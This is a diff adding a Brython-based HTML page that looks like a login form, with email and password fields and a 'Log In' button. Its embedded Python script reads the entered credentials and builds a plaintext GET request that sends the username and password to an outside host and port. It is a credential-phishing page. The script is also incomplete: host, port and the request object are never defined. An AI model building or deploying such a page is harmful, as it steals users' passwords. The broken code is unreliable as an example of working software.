@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script src="./brython.js"></script>
+    <script src="./brython_stdlib.js"></script>
+</head>
+<body onLoad="brython(1)">
+<input id="email" value="Email Address">
+<INPUT id="pass" value="Password">
+<button id="submit">Log In</button>
+<script type="text/python3">
+    from browser import document,ajax
+    def submit_creds(ev):
+        username=document["email"].value
+        password=document["pass"].value
+        url = "http://" + host + ":" + port + "?user=" + username + "&password=" + password
+        #req.bind("complete", complete)
+        req.send()
+    document["submit"].bind("click", submit_creds)
+</script>
+</body>
+</html>
